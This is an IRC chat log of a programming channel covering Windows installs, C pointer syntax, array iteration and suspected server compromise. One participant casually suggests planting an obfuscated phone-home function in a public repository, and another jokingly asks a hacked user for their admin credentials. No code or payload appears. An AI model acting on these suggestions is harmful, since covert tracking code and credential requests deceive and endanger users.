[13:02:02] <sonny> I've used windows efi partition before
[13:02:15] <sonny> in general dual boot doesn't work for long
[13:02:29] <mrig> but I cant even set my own home folder name in windows, its insane, could not log into it either as whislt on the install first login screen it locks you to that screen and then sends you emails as a way to verify stuff :|
[13:02:47] <mrig> sonny it lis like walking on eggshells :|
[13:02:48] <sonny> your home folder name is your username
[13:02:58] <davve> if you install windows without ethernet connected you can bypass that stuff
[13:03:21] <sonny> yeah, you have to select I don't have internet
[13:03:29] <mrig> I had no option to set this though, it did it for me adding an extra letter for some insane reason.
[13:03:40] <mrig> now all my scripts that were using the path are wrong.
[13:03:59] <mrig> Oh that is good to know.
[13:04:02] <sonny> can be fixed I imagine
[13:04:13] <mrig> cryptic workarounds, so crazy that you should need them.
[13:04:33] <sonny> I've wasted so much time installing OSes
[13:04:54] <sonny> I know all the details
[13:04:56] <mrig> yes it can, it's like speaking with that old ex girlfriend who is still gaslighitng you :|
[13:05:16] * mrig tiptows about the setup, dang software is crap.
[13:05:28] <sonny> there's even a way to get to an old school wizard for the install
[13:05:41] <sonny> looks like win7
[13:05:43] *** Quits: flakland (~flaknet99@32.211.211.39) (Remote host closed the connection)
[13:06:05] <mrig> It does seem that there are ways to get back to the old sane paths, but you really need to have a lot of regular experisace it would seem.
[13:06:20] <sonny> ? both paths are supported
[13:07:17] *** Quits: Daemonick (~Daemonick@77.49.175.20.dsl.dyn.forthnet.gr) (Ping timeout: 240 seconds)
[13:07:19] <mrig> how so?
[13:07:37] <sonny> I assume you mean the seperators / and \
[13:08:36] <mrig> oh no, I mean the paths through the layers of different OS abstractions, you mentioned that it is possible to shine the old win 7 menus back into existance.
[13:08:51] <sonny> ah no, just for the installation
[13:08:55] <mrig> the paths through UI
[13:08:56] *** Joins: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad)
[13:08:57] <sonny> there's an alternate wizard
[13:09:04] *** Joins: fe23 (~fe23@2409:8a34:464:4990:ac00:ae21:4f94:304c)
[13:09:22] <sonny> honestly, you probably can
[13:09:35] <sonny> but I don't know that much
[13:10:43] <mrig> heh, anyhow, just wondering whether to change the path to what I would like it to be, or just submit to the OS's dommiinatrix type character and change all the paths in my scripts so that it is easyer the next time.
[13:11:02] <mrig> anything for a peacful and simple easy llife :)
[13:11:14] <sonny> I couldn't even figure out something trivial like where the background photos were comming from
[13:11:57] <mrig> Normaly by now I would have just broken off the relationship and put down to experiance, but I really do want to do these turtorials in the same environment that they were authord in.
[13:12:09] <mrig> keeping the variable count down again.
[13:12:12] <sonny> what are you changing paths for?
[13:12:22] <mrig> batch scripts.
[13:12:27] <sonny> lol
[13:12:43] <sonny> that's brave, powershell is a huge upgrade
[13:12:49] <mrig> and it just annoys the hell out of me that it is not what I would like it to be.
[13:12:55] <mrig> I type it all the time.
[13:12:59] *** Quits: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad) (Remote host closed the connection)
[13:13:06] *** Joins: murii (~murii@2a02:a58:835a:1100:7400:f242:145a:79ad)
[13:13:25] <sonny> I dunno I can't tell the problem
[13:13:32] <mrig> its not like file system trees are a complicated aspect of CS :|
[13:13:33] *** Quits: Themis3000 (~Thunderbi@user/themis3000) (Quit: Themis3000)
[13:13:35] *** Joins: CyberTailor (~cyber@gateway/tor-sasl/cybertailor)
[13:13:36] <mrig> lol
[13:14:06] <sonny> ntfs live grow and shrink amazes me
[13:14:29] <mrig> oh no problem, I suppose I'm venting my frustration for whcih I apologise, jut thought that there could be some thread of logic to the apparent insanity of it all. :)
[13:15:23] <mrig> and my linux install is still buggy, so should really reainstall that too now that It's already done and set is still really pending. 
[13:15:34] <sonny> my problem with windows is the documentation
[13:15:44] *** Joins: plastico (~plastico@neomutt/plastico)
[13:15:47] <davve> mrig: a pro tip is to keep your home partition separate
[13:15:57] <mrig> davve yes I do do that.
[13:16:07] <davve> good
[13:16:17] <davve> that makes it less painful to reinstall :)
[13:16:46] <mrig> yes it's a pretty quick thing with the OS appart, I'm pondering switching distro is the thing.
[13:17:14] <mrig> as the latest debian has some pretty bad bugs and I'm to busy to go chasing them.
[13:17:45] <mrig> so either an older one or a differnt distro.
[13:19:30] <KillerWasp> nice, i make a short access without redirect, or without rewrite: http://bluebeacon.blackrook.xyz/
[13:19:31] <bayaz> Title: BLUE-BEACON! 
[13:19:32] <mrig> I should just file a bug report, but spend all my time in windows right now. Funny thing how the author of the tutorials spends quite a lot of time complaining about modern software :)
[13:19:36] <davve> thats what I do when one distros idiotisms annoy me enough
[13:20:03] <KillerWasp> also i prepare a nice 404.
[13:20:40] <KillerWasp> I only know 404 as frequent errors, what other errors could appear?
[13:20:41] <mrig> davve well yes, and when the response to any interaction is some twit complaining about the way that you have written the question, you just feel like wandering off else where.
[13:21:25] <mrig> if programmers payed as much attention to UI as they do to semantics, the worlds would be a far better place!
[13:22:03] <davve> haha
[13:22:22] <davve> well, if there were as many designers involved in open source as developers that would be good too
[13:22:24] *** Quits: ttree (~ttree0@c-73-169-193-237.hsd1.wa.comcast.net) (Ping timeout: 268 seconds)
[13:22:48] <mrig> It's like a world wide bsm fest of stockholm syndome appreciation!
[13:23:15] <mrig> bdsm rather
[13:23:34] <davve> i think you sohuld experiment with different window managers/desktop environments you prefer
[13:23:45] *** Quits: pavonia (~user@user/siracusa) (Quit: Bye!)
[13:23:50] <davve> then put the configs for those in your home dir and you can replicate your system with any distro
[13:24:13] <mrig> oh can you use the config of one linux in another?
[13:24:15] <davve> and can just find a distro which conventions/package manager annoys you the least
[13:24:19] *** Joins: LucaTM (~LucaTM@user/lucatm)
[13:24:42] <mrig> I still get confused as to where the line is between linux and the desktop, if Im honest.
[13:25:04] <davve> yeah... its commonly refered to as dotfiles... since the files are typically stored in hidden dirs (starting with period like ~/.config/)
[13:25:57] <mrig> sure yes, I do keep a hold of all those, tend to when reinstalling, make a seperate file and copy things over bit by bit, as I don't really know what is doing what.
[13:27:04] <mrig> anyhow, it will be nice once I've written a linux layer for this tutorial and its code so that I could work on it from linux :)
[13:27:29] <mrig> am thinking that using a wm and learning more about only the linux part would be useful.
[13:27:45] <mrig> I tilling manager rather than a full desktop.
[13:27:48] <CoderGuy> wow so much changes with a tiny bit of knowledge
[13:28:04] <mrig> CoderGuy nice :)
[13:29:00] <CoderGuy> I was convinced foreach() meant you can't change the element but it actually means "if you're iterating through an array with values that are things like int's or strings then you can't change & store the value via element = 5; or element = "stuff"; but if you're iterating through an array of arrays well then
[13:29:08] <CoderGuy> now you can do element[0] = "whatever you want"; and it changes
[13:29:59] <PlanckWalk> Changing things you're iterating over is bad news unless the language guarantees that it isn't.
[13:30:26] *** Quits: k3nn7 (~k3nn7@2a02:a31b:43e:aa80:d587:8a31:ef7e:658f) (Ping timeout: 256 seconds)
[13:30:35] *** Joins: icy_troubles (~icy_troub@cpef81d0fa691a3-cmf81d0fa691a0.sdns.net.rogers.com)
[13:31:17] <GeDaMo> Replacing an element is less bad than inserting or deleting
[13:31:23] <PlanckWalk> Usually yes
[13:32:58] <PlanckWalk> Even then it can be a bit icky if you're doing something like iterating over key-value pairs and you change one of the values
[13:34:17] <varaindemian> anyone who might want to scroll a bit up and answer my question? :D
[13:34:36] *** Joins: inlight (~inlight@157.35.70.148)
[13:34:36] *** Quits: inlight (~inlight@157.35.70.148) (Changing host)
[13:34:36] *** Joins: inlight (~inlight@user/inlight)
[13:34:38] <varaindemian> 11:22 AM
[13:36:20] <CoderGuy> varaindemian, what is a CVE?
[13:36:35] <CoderGuy> code version error?
[13:36:44] <GeDaMo> https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures
[13:36:44] <bayaz> Title: Common Vulnerabilities and Exposures - Wikipedia 
[13:36:45] <varaindemian> CoderGuy: Common Vulnerabilities and Exposures
[13:37:00] *** Quits: loganlee (~Thunderbi@user/loganlee) (Quit: loganlee)
[13:37:01] <CoderGuy> oh
[13:37:49] <varaindemian> I mean it is a malicious cookie
[13:38:17] <CoderGuy> like
[13:38:23] <CoderGuy> what are you even doing to be in this state of questioning?
[13:38:28] <CoderGuy> I have no idea how to even approach answering
[13:38:59] <Deknos> yeah varaindemian your texts are to distributed here in the chat...
[13:39:28] <varaindemian> Deknos: ah?
[13:39:40] <varaindemian> I found requests with that cookie..
[13:39:50] <varaindemian> now I am trying to determine what it really is
[13:39:56] <CoderGuy> so you were on a site?
[13:40:02] <CoderGuy> and the site gave you a cookie
[13:40:05] <Deknos> you should quote your links again
[13:40:06] <CoderGuy> and you were like "hmm what's this all about?" 
[13:40:11] <varaindemian> those are from a server
[13:40:46] <CoderGuy> you gotta be specific in what you're asking, we aren't you
[13:41:02] <CoderGuy> like walk us through this, what is it you're trying to figure out & why?
[13:41:04] <varaindemian> This might be related to what I found on the server: https://www.unphp.net/decode/7f603e7b97dc67a3a54a3bbccd64bd5c/
[13:41:11] <CoderGuy> again not helpful 
[13:41:19] <CoderGuy> what's helpful is asking a question specifically
[13:42:32] <varaindemian> CoderGuy: ok, so, I found multiple events on my server with GET requests where the Cookie header contained what I just sent here and now I am trying to figure out what it is. Maybe it is a well known CVE
[13:43:16] <Deknos> you think you were perhaps hacked, yes?
[13:43:28] <varaindemian> yes
[13:43:50] <CoderGuy> okay so you're saying somewhere on your server are some files doing fishy stuff?
[13:44:21] *** Quits: mrig (~mrig@user/mrig) (Remote host closed the connection)
[13:44:27] <Trashlord> if you need help, give us the admin user and password, we can take a look and help diagnose the problem
[13:44:38] <CoderGuy> Trashlord, you're disgustingly harmful
[13:44:46] <CoderGuy> that is not what you say to someone holy
[13:44:53] <Trashlord> really?
[13:45:19] <CoderGuy> but then again I Mean if they were to listen to you chances are they were hacked so
[13:45:44] <varaindemian> they've probably been stopped by other security "layers" . I am just trying to understand is whether this is a common attack or not and find out maybe a CVE for this php thing
[13:46:05] <CoderGuy> varaindemian, are you on shared or vps?
[13:46:37] <varaindemian> not sure
[13:46:42] <CoderGuy> dude
[13:46:48] <CoderGuy> how are you in this chatroom XD
[13:46:53] <varaindemian> does that Cookie in the request ring a bell for anyone?
[13:47:09] *** Quits: rwx (~user@tilde.team/user/mspe) (Quit: WeeChat 2.8)
[13:47:33] <CoderGuy> varaindemian,  you might want to try #security for better results but I will say this, you need to know what server you're looking at to even start making these questions
[13:47:55] <CoderGuy> like if you're on shared hosting then a lot of things can happen because of your shared hosting provider
[13:48:08] <CoderGuy> and if you're vps then whoever setup the server knows exactly what should happen versus what is happening
[13:48:17] *** Quits: Akiva (~Akiva@user/Akiva) (Ping timeout: 240 seconds)
[13:48:51] *** Quits: xff0x (~xff0x@2001:1a81:5370:9b00:cd1d:3c45:12cd:b91e) (Ping timeout: 250 seconds)
[13:48:55] *** Joins: mspe (~user@tilde.team/user/mspe)
[13:49:52] <CoderGuy> PlanckWalk, I mean how else do you update values without iterating through it?
[13:49:55] *** Joins: xff0x (~xff0x@2001:1a81:5370:9b00:ba06:1021:b5e3:5719)
[13:50:14] <varaindemian> CoderGuy: my questions was about determining whether that was part of a CVE
[13:50:32] <CoderGuy> varaindemian, the problem is without knowing "what should be happening" it's hard to tell
[13:52:33] *** Joins: mjbatty (~mjbatty@82.2.17.205)
[13:53:14] <CuriousErnestBro> hi
[13:53:38] <GeDaMo> Hi CuriousErnestBro :)
[13:56:45] *** Quits: mjbatty (~mjbatty@82.2.17.205) (Client Quit)
[13:56:52] *** Quits: berkhan (~berkhan@159.146.43.146) (Quit: Leaving for now. See you next time.)
[13:57:02] *** Joins: amigojapan (uid86330@id-86330.helmsley.irccloud.com)
[13:59:18] *** Parts: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca) (Closing Window)
[14:00:13] *** Joins: Lord_of_Life_ (~Lord@user/lord-of-life/x-2819915)
[14:00:51] *** fuzzykef is now known as furrykef
[14:01:14] *** Quits: Lord_of_Life (~Lord@user/lord-of-life/x-2819915) (Ping timeout: 268 seconds)
[14:01:30] *** Lord_of_Life_ is now known as Lord_of_Life
[14:03:20] <PlanckWalk> CoderGuy: One way is to make a copy with changed values
[14:03:51] *** Quits: sdfgsdfg (~sdfgsdfg@user/sdfgsdfg) (Ping timeout: 256 seconds)
[14:03:53] *** Joins: sdfgsdfgsdfgsfsd (~sdfgsdfg@user/sdfgsdfg)
[14:03:55] *** Quits: flynn (~mcbloch@user/flynn) (Read error: Connection reset by peer)
[14:04:10] <PlanckWalk> Some languages make it safe to change values without any structural changes.
[14:04:18] *** Joins: flynn (~mcbloch@user/flynn)
[14:05:03] <PlanckWalk> (Especially if it's just an array)
[14:05:37] <PlanckWalk> It can be dangerous on things like sorted data structures, though.
[14:06:07] *** Joins: xkuru (~xkuru@user/xkuru)
[14:06:45] *** Joins: Camilo (~hugh@83.151.206.23)
[14:07:40] <CoderGuy> PlanckWalk, so is there anything wrong in say javascript with doing var a = []; var b = [[][]]; b[0] = a; b.foreach(element => { element[0] = 5;});
[14:08:17] <CoderGuy> or I guess var b = [[],[]];
[14:08:58] <PlanckWalk> That should be okay, yes
[14:09:06] <CoderGuy> so why is that okay and what am I supposed to be scared of?
[14:09:13] *** Joins: GreenAlpaca (~GreenAlpa@user/greenalpaca)
[14:09:29] <PlanckWalk> Err wait, let me refresh my memory on what Javascript does when you assign to a missing array element
[14:09:58] <CoderGuy> oh like if something was null during the process?
[14:10:10] <PlanckWalk> Yeah, looks like it's okay due to how Javascript implements them
[14:10:22] <PlanckWalk> Its arrays are really dictionaries
[14:10:52] <PlanckWalk> I mean like you've got  element = [], then element[0] = 5
[14:11:03] <PlanckWalk> But [] doesn't have an index 0
[14:11:20] <PlanckWalk> Many other languages will throw an error at that
[14:11:32] *** Quits: caramel (~caramel@user/caramel) (Read error: Connection reset by peer)
[14:12:46] <CoderGuy> okay considering I account for null entries then is it okay?
[14:12:57] <PlanckWalk> Javascript is fine with it, and you can even write []["Hello"] = 5.
[14:13:03] *** Quits: icy_troubles (~icy_troub@cpef81d0fa691a3-cmf81d0fa691a0.sdns.net.rogers.com) (Ping timeout: 256 seconds)
[14:13:26] <CoderGuy> right but i'm just looking at the process in general, is it okay considering I account for null type errors or index out of bounds exceptions?
[14:14:06] <PlanckWalk> Yes, but the equivalent process might not be okay in other languages or with other data structures
[14:14:19] <CoderGuy> what are some examples of how it would be a bad idea?
[14:15:00] <Decker> for( n = 0; n < arr.length; n++ ) arr[n+1]=arr[n]
[14:15:26] <CoderGuy> Decker I would check to make sure n + 1 < arr.length
[14:15:39] <CoderGuy> also that infinite loops no?
[14:15:41] <Decker> why - you're doing an insert... *shrug*
[14:15:43] <Decker> yes
[14:15:53] <CoderGuy> yeah I wouldn't do stuff like that, but good example
[14:16:07] *** Joins: Duality (~robert@217.119.239.2)
[14:16:11] <Duality> I have a question
[14:16:18] <CoderGuy> you've come to the best place
[14:16:19] <CoderGuy> ask away
[14:16:19] <Decker> slicing while you're at element 5 and have 10
[14:16:28] <Decker> splicing I mean
[14:16:29] <CoderGuy> ic so don't do stupid things & it's okay
[14:16:36] <Duality> about C programming what is the preffered place to put the * when making pointers for example 
[14:16:45] <GeDaMo> int *a;
[14:16:55] <Decker> int* a;
[14:16:57] <PlanckWalk> Yes, only what each language and/or data structure considers "stupid things" changes in often nonobvious ways
[14:17:01] <CoderGuy> ooo Duality GeDaMo is very good at that
[14:17:02] <leduyquang753> `int *a` follows the actual parsing behavior.
[14:17:02] <Duality> i have been doing it like this: int *a;
[14:17:08] <Decker> pick a style and follow it
[14:17:18] <GeDaMo> int* a, b; what type is b?
[14:17:22] <Duality> int
[14:17:23] <Decker> it's clearer for int *a,*b,*c to have it on the right
[14:18:02] <Duality> why is that clearer
[14:18:04] <CoderGuy> PlanckWalk, oh ic
[14:18:12] <Duality> (just trying to get an intuition for it)
[14:18:12] <Decker> because b doesn't have one
[14:18:13] <CoderGuy> PlanckWalk, okay cool i'll try not to be dumb as I always do with coding lol
[14:18:17] <Decker> in the other case
[14:18:38] <PlanckWalk> CoderGuy: E.g. imagine you're iterating over a priority queue, sorted by value of some element property.  If you change the property during iteration, the same element may come up again later.
[14:18:49] <GeDaMo> It's probably best to not declare pointer and non-pointers in the same declaration anyway
[14:18:51] <PlanckWalk> Or it might not
[14:19:02] <CoderGuy> PlanckWalk, icic, yeah that's definately I was doing queue stuff as well interesting
[14:19:19] <CoderGuy> PlanckWalk, overall i'm probably going to use recursion but i'm exploring this for fun it's just so interesting
[14:19:38] <PlanckWalk> The same thing can happen with recursion as with iteration
[14:19:51] <Duality> so * is a property of the variable and not of the type did i say that correct like the * just say this variable is a pointer and the type just says oh it points to a int or something
[14:20:25] <GeDaMo> It binds to the variable name, not the type
[14:20:41] <Duality> that is a way to say what i said i think :)
[14:21:02] <GeDaMo> I optimized it :P
[14:21:28] <CuriousErnestBro> sup GeDaMo what's going on today
[14:21:37] <Duality> i have been saying "int pointer" in my head but that might not be the right way to think of it
[14:21:44] *** Joins: caramel (~caramel@user/caramel)
[14:21:52] <Duality> sometimes when  you optimize it becomes unclear but yours was clear and consice 
[14:21:59] <CoderGuy> PlanckWalk, oh good to know
[14:22:00] <GeDaMo> uh, not much
[14:22:03] *** Joins: maxzor (~maxzor@2a01cb04054faa00014166c992826b72.ipv6.abo.wanadoo.fr)
[14:22:38] <CoderGuy> PlanckWalk, welp i'm not the greatest coder but if there was one thing my teachers did train me in, it was preventing infinite loops & null/out of index exceptions
[14:24:13] *** Quits: maxzor_ (~maxzor@2a01cb04054faa004cde64db429acd32.ipv6.abo.wanadoo.fr) (Ping timeout: 240 seconds)
[14:24:47] <CuriousErnestBro> are we doing C?
[14:25:00] *** Quits: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:25:42] *** Joins: Daemonick (~Daemonick@77.49.175.20.dsl.dyn.forthnet.gr)
[14:25:44] <GeDaMo> C declarations, yes :P
[14:28:01] <Duality> Just trying to make sense of it
[14:30:20] *** Joins: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b)
[14:30:30] *** Joins: trevors (~trevors@c-65-96-171-157.hsd1.ma.comcast.net)
[14:31:11] *** Quits: Camilo (~hugh@83.151.206.23) (Ping timeout: 256 seconds)
[14:32:37] *** Quits: cursey_ (~cursey@user/cursey) (Quit: bye)
[14:32:59] <GeDaMo> https://cdecl.org/
[14:33:00] <bayaz> Title: cdecl: C gibberish ? English 
[14:33:42] *** Joins: operateur (~operateur@109.93.181.255)
[14:36:57] *** Joins: Shashin (~Shashin@cpc112711-nmal22-2-0-cust53.19-2.cable.virginm.net)
[14:37:31] *** Joins: joe_colben (~joe____co@185.190.112.211)
[14:41:53] *** Joins: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net)
[14:42:52] <pyzozord> damn my company doesn't let me use a vm
[14:42:59] <pyzozord> I'm stuck with macos utils :/
[14:43:41] *** sdfgsdfgsdfgsfsd is now known as dikhed
[14:44:09] *** dikhed is now known as dfghfgdh
[14:45:33] *** Joins: cursey (~cursey@user/cursey)
[14:45:51] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[14:46:21] *** Quits: GreenAlpaca (~GreenAlpa@user/greenalpaca) (Quit: WeeChat 3.4)
[14:46:42] *** Quits: rustyshackleford (uid236774@id-236774.helmsley.irccloud.com) (Quit: Connection closed for inactivity)
[14:48:02] *** Quits: breavyn (~breavyn@user/breavyn) (Ping timeout: 260 seconds)
[14:48:50] *** Joins: breavyn (~breavyn@user/breavyn)
[14:49:40] *** Quits: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470) (Remote host closed the connection)
[14:55:01] *** Joins: Twipply (~Twipply@user/twipply)
[14:56:57] *** Joins: anovick (~anovick@2a0d:6fc0:1ce2:c500::34d)
[14:59:35] <CuriousErnestBro> tried saying you want docker?
[15:00:14] *** Joins: inky_ (~inky@5.77.223.178)
[15:01:12] *** Joins: hoochmonger (~hoochmong@user/hoochmonger)
[15:02:31] *** Joins: Guest6286 (~Guest62@dyx0pyyckgjfhcv-501mt-3.rev.dnainternet.fi)
[15:02:53] *** Quits: operateur (~operateur@109.93.181.255) (Quit: WeeChat 2.8)
[15:05:30] *** Joins: enoq (~enoq@2a05:1141:1f5:5600:b9c9:721a:599:bfe7)
[15:13:16] *** Quits: echoSMILE (uid504326@user/echosmile) (Quit: Connection closed for inactivity)
[15:19:25] *** Joins: GreenAlpaca (~GreenAlpa@user/greenalpaca)
[15:20:21] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[15:21:41] *** Quits: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net) (Quit: https://quassel-irc.org - Chat comfortably. Anywhere.)
[15:22:09] <Thedarkb1-Work> Do your development on sdf.org lol
[15:23:08] *** Joins: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net)
[15:23:38] *** Quits: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net) (Client Quit)
[15:24:24] *** Quits: Guest6286 (~Guest62@dyx0pyyckgjfhcv-501mt-3.rev.dnainternet.fi) (Quit: Client closed)
[15:25:10] *** Joins: ___nick___ (~quassel@cpc68286-cdif17-2-0-cust533.5-1.cable.virginm.net)
[15:25:49] *** Joins: ProfSimm (~ProfSimm@87.227.196.109)
[15:27:41] *** Quits: wildo (~lain6141@119.224.72.222) (Quit: leaving)
[15:32:18] *** Joins: Iarfen (~quassel@181.43.57.45)
[15:35:47] *** Joins: mrig (~mrig@user/mrig)
[15:36:53] <mrig> Yikes, one more windows install later ...
[15:37:48] *** Joins: bauripalash (~bauripala@2401:4900:382e:9ffb:1:2:2af6:efac)
[15:40:33] *** Joins: panusiik (~P4nuS2k@109.204.202.167)
[15:41:57] *** Quits: GreenAlpaca (~GreenAlpa@user/greenalpaca) (Quit: WeeChat 3.4)
[15:42:25] *** Quits: bauripalash (~bauripala@2401:4900:382e:9ffb:1:2:2af6:efac) (Client Quit)
[15:42:26] *** Quits: myon98 (~myon98@user/myon98) (Ping timeout: 250 seconds)
[15:43:09] *** Quits: P4nuS2k (~P4nuS2k@dynamic-219-5.keskikaista.fi) (Ping timeout: 256 seconds)
[15:44:11] *** Joins: vysn (~vysn@user/vysn)
[15:48:59] <novns> who and why clones my small and unfinished project on github?
[15:49:20] <novns> 3 clones today
[15:49:40] <novns> some bots maybe
[15:52:27] *** Quits: kish` (~aqua@user/aqua) (Ping timeout: 276 seconds)
[15:52:36] *** Joins: aqua (~aqua@user/aqua)
[15:53:04] *** Joins: rickybob (~rickybob@gateway/vpn/pia/rickybob)
[15:53:56] <PlanckWalk> Insert an obfuscated phone home function and see if anyone ever runs it (outside a jailed VM)
[15:55:16] *** Joins: GreenAlpaca (~GreenAlpa@user/greenalpaca)
[15:55:30] *** Joins: hmm (~hmm@c-24-126-74-244.hsd1.md.comcast.net)
[15:56:32] *** Quits: etolier_ (~somewhere@202-144-174-137.ip4.superloop.com) (Quit: No Ping reply in 180 seconds.)
[15:57:41] <nomagno> novns: I'm having the same issue, but with actual spammer trolls in Gitea, which is a much smaller forge
[15:57:49] <nomagno> Two in the last month
[15:57:55] *** Joins: etolier (~somewhere@202-144-174-137.ip4.superloop.com)
[15:58:59] <nomagno> Oh and they submit regression PRs, that don't do anything but revert my current changes.
[15:59:59] <novns> nomagno, they commit something at least
[16:00:09] <GeDaMo> Maybe they're trying to increase their activity graphs
[16:00:31] <novns> GeDaMo, it's not forks, it just clones
[16:00:42] <GeDaMo> "Look how much I contribute to open source, potential employer!"
[16:01:08] <nomagno> novns: No no no, it's clicking 'fork', waiting for the next big commit, them submitting a PR with a random name like "ajwidkdk" without syncing
[16:01:36] <novns> nomagno, is it your own gitea installation?
[16:01:48] <novns> you can disable registering new users
[16:02:02] <nomagno> novns: Public one, I don't really feel like paying for a VPS right now
[16:02:32] *** Quits: hmm (~hmm@c-24-126-74-244.hsd1.md.comcast.net) (Quit: Connection closed)
[16:02:57] <nomagno> I will, in the future, I chose Gitea because the web frontend features make it the perfect forge when I eventually self-host
[16:03:11] *** Quits: xff0x (~xff0x@2001:1a81:5370:9b00:ba06:1021:b5e3:5719) (Ping timeout: 250 seconds)
[16:04:06] *** Joins: xff0x (~xff0x@2001:1a81:5370:9b00:6eaf:9722:88af:e2d)
[16:04:31] <novns> nomagno, as your nicknames ends with a vowel, I suggest you have some Italian origin
[16:04:42] *** Quits: GreenAlpaca (~GreenAlpa@user/greenalpaca) (Quit: WeeChat 3.4)
[16:04:43] *** Joins: jamea (~jamea@177.239.81.39)
[16:04:56] <novns> so you can ask your friends from the mob to solve this problems for you :)
[16:05:02] *** Joins: GreenAlpaca (~GreenAlpa@user/greenalpaca)
[16:05:08] <novns> *these problems
[16:05:28] <nomagno> Uh, no, it's a Spanish transliteration of "Not" and "Magnus"
[16:05:32] *** gitesh is now known as ramkrishnahari
[16:05:53] *** Quits: tomate (~hubrecht@125.ip-51-178-27.eu) (Quit: WeeChat 2.3)
[16:05:57] *** ramkrishnahari is now known as gitesh
[16:06:04] <nomagno> Means "I am not great"
[16:06:47] *** Joins: Haxxa (~Haxxa@202-144-174-197.ip4.superloop.com)
[16:06:51] *** Quits: Gentpup (~Gentpup@217.75.212.43) (Remote host closed the connection)
[16:07:04] <novns> then you should own some fighting bulls, you can set up some accident for those trolls
[16:07:21] *** Quits: Shashin (~Shashin@cpc112711-nmal22-2-0-cust53.19-2.cable.virginm.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[16:07:54] <nomagno> Bullfighting is cruel.
[16:08:08] <nomagno> For the bulls, not the trolls
[16:08:18] *** Joins: tomate (~hubrecht@125.ip-51-178-27.eu)
[16:08:53] *** Joins: flipchan (~filip@user/flipchan)
[16:09:11] <novns> Spain has a historical culture of poisoning too
[16:09:31] <mrig> Do any windows experts know if a barebones install of visual studio will include the basic C++ compiler and windows libs?
[16:10:21] <nomagno> mrig: Visual Studio is 'the MSVC++ IDE', so I'd assume so
[16:10:22] <Decker> you have to select c++ development
[16:10:34] <mrig> I should just go ahead, im sure that there is an interface to add later, was wanting to avoid intalling more gmupfh than I really need to.
[16:11:15] <mrig> well there are about 5 different c++ choices
[16:11:28] <mrig> most of them with tones of things that I just dont need.
[16:11:57] <Decker> (for desktop) ?  
[16:12:07] <Decker> aren't the others like (for -someplatform- ) ?
[16:12:20] <mrig> sure yes, but I dont need any of the build systems that It is then going to install.
[16:12:39] <mrig> I suppose that's sure to have the windows api init though.
[16:13:16] <mrig> I'm tempted to try as is with none selected to see what it puts on, I only want the compiler and the debugger for what I'm doing.
[16:13:18] <Decker> ya mobile ,game,...
[16:13:39] <flipchan> Hey, im stuck on some shell, cant get a function from another file to change a local variable when imported, anyone got any idea?: https://dpaste.com/7SPN6883C
[16:13:44] <mrig> there is a for linux option too and others.
[16:13:58] <Decker> mrig you can but then you don't have cl/or a windows sdk
[16:14:31] <Decker> just the c++ desktop; the only other one I have is C# desktop 
[16:14:39] <mrig> oh right that is exactly the info that I need, so I'll install the desktop otion.
[16:14:52] <flipchan> any bash hackers in the room?:)
[16:15:04] <mrig> just trying to stop it from taking up all of my disk space.
[16:15:10] <Decker> yup
[16:15:23] <mrig> which is why I've had this hell of a situation in the first place.
[16:15:33] <mrig> oh windows ...
[16:15:35] <mrig> :D
[16:16:07] *** Quits: Lazenca (Lazenca@user/lazenca) (Remote host closed the connection)
[16:16:34] <nomagno> How likely am I to encounter a 32 bits system that does not support >64KBs arrays in C?
[16:16:53] <mrig> well a very big thankyou to whoever it was that tould be that if you unplug from the net whilst installing windows, it is a little less abusive, that i fantastic advice that has worked a treat!
[16:17:12] <nomagno> Oh NVM, I just realized I already though of this
[16:17:19] <Decker> mrig oh :) you didn't know that?
[16:17:39] <Decker> you asked about user account... thought you already had one and wanted more...
[16:17:49] <Decker> that supposedly doesn't work with windows 11
[16:17:51] <mrig> No I didn't, the thing had me running around in circles and doing handstands for it  ...
[16:17:54] *** Joins: Mangy_Dog (Mange@user/mangy-dog/x-7397214)
[16:18:09] <Decker> ya - harder when it's wifi... had to find the airplane mode
[16:18:13] <mrig> really abusive install process when connected to the interwebs.
[16:18:18] <nomagno> However, you need a Microsoft account to fully disable the windows defender
[16:18:24] <nomagno> Which I find ridiculous
[16:19:00] <mrig> I've an account that I dont mind using, I just object to not having the file system folder name that I would like.
[16:19:30] <mrig> The worst thing about the whole install is the "Sit back and relax whilst we work our magic" comment. 
[16:19:49] <Decker> ya :) 
[16:19:54] <Decker> but the registry is so slow...
[16:19:55] <mrig> When installing for the second time in a row and it has already trounced your linux install once.
[16:19:55] <nomagno> I cross-compile potentially malicious software for Windows all the time, issue being the software is made by me, so I know it is not malicious
[16:20:10] *** Joins: Klinda (~superleag@user/klinda)
[16:20:12] <nomagno> So it IS a real issue
[16:20:29] <Decker> 'are you sure you trust these developers?' :)
[16:20:49] *** Joins: k3nn7 (~k3nn7@2a02:a31b:43e:aa80:1775:e3c1:d941:4f84)
[16:21:00] <Decker> that 'no' applies to such a small minority... it's super annoying it's there
[16:21:33] *** Quits: Daemonick (~Daemonick@77.49.175.20.dsl.dyn.forthnet.gr) (Ping timeout: 256 seconds)
[16:22:18] <nomagno> I argue no developers are trustworthy, so the question is flawed in the first place
[16:22:32] *** Joins: Brett[Air] (~Brett@124.148.79.4)
[16:22:42] <mrig> I dissagree with that.
[16:22:46] <nomagno> "These developers could have embedded a 1KB crypto miner in the program! Watch out!"
[16:23:02] <mrig> just need better employment practices, and above that education.
[16:23:11] <mrig> simple really.
[16:23:26] <mrig> but if you worship competition, you will have problems.
[16:23:34] *** Joins: DnzInFirefox (~DnzInFire@mobile-access-6df083-245.dhcp.inet.fi)
[16:23:39] <DnzInFirefox> yello
